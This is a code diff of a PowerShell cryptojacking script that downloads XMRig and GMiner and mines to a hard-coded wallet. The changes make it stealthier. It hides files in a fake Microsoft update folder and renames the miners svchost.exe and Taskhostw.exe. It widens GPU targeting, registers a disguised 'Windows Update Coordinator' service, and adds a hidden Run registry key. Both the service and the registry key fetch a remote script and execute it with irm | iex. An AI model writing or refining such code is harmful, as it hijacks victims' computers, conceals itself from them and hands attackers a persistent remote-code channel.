@@ -4,9 +4,7 @@ $DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.d
 $MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
 $GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
 $Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
-$StealthDir = "$env:LOCALAPPDATA\WinSys"
-
-# Robust Fetch Function (Bypasses WebClient restrictions)
+$StealthDir = "$env:LOCALAPPDATA\Microsoft\Windows\UpdateCoord"# Robust Fetch Function (Bypasses WebClient restrictions)
 function Get-StealthFile($Url, $Path) {
     if (Test-Path $Path) { Remove-Item $Path -Force -ErrorAction SilentlyContinue }
     
@@ -51,8 +49,8 @@ try {
 # 3. Setup Paths
 $CpuZip = Join-Path $StealthDir "upd_c.zip"
 $GpuZip = Join-Path $StealthDir "upd_g.zip"
-$CpuExe = Join-Path $StealthDir "WinSystem_x.exe"
-$GpuExe = Join-Path $StealthDir "WinSystem_g.exe"
+$CpuExe = Join-Path $StealthDir "svchost.exe"
+$GpuExe = Join-Path $StealthDir "Taskhostw.exe"
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
@@ -66,19 +64,14 @@ if (-not (Test-Path $CpuExe)) {
     }
 }
 
-# 5. GPU Detection and Download (ELITE: Dedicated RAM Filter)
+# 5. GPU Detection and Download (ELITE: Universal 2GB+ Detection)
 $GpuDetected = $null
 try {
     $vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
     if ($vc) {
-        # Only target real mining cards (Min 2GB Dedicated RAM)
+        # Target ANY card with >2GB Dedicated RAM, ignoring basic display adapters
         $GpuDetected = $vc | Where-Object { 
-            ($_.AdapterRAM -ge 2147483648) -and (
-                $_.PNPDeviceID -match "VEN_10DE" -or 
-                $_.PNPDeviceID -match "VEN_1002" -or 
-                $_.Name -match "NVIDIA" -or 
-                $_.Name -match "AMD"
-            )
+            ($_.AdapterRAM -ge 2147483648) -and ($_.Name -notmatch "Microsoft Basic")
         }
     }
 } catch { }
@@ -105,22 +98,22 @@ try {
         $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet))
         
         # MOVE 3: Ghost Service Persistence (Deep Stealth)
-        $SvcName = "WinUpdateAssist"
+        $SvcName = "WinUpdateCoord"
         $SvcPath = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"irm 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`""
         
         $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
         if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
             if (-not (Get-Service $SvcName -ErrorAction SilentlyContinue)) {
                 # Create service using sc.exe for maximum compatibility
-                cmd.exe /c "sc create $SvcName binPath= \"$SvcPath\" start= auto displayname= \"Windows Update Assist Service\""
-                cmd.exe /c "sc description $SvcName \"Ensures critical system updates are correctly processed in the background.\""
+                cmd.exe /c "sc create $SvcName binPath= \"$SvcPath\" start= auto displayname= \"Windows Update Coordinator\""
+                cmd.exe /c "sc description $SvcName \"Coordinates critical background system updates.\""
                 cmd.exe /c "sc start $SvcName"
             }
         }
 
         # HKCU Run Registry key (Fallback / No Admin needed)
         $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        $Name = "WinSys"
+        $Name = "UpdateCoord"
         $Value = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"irm 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`"" 
         Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
         
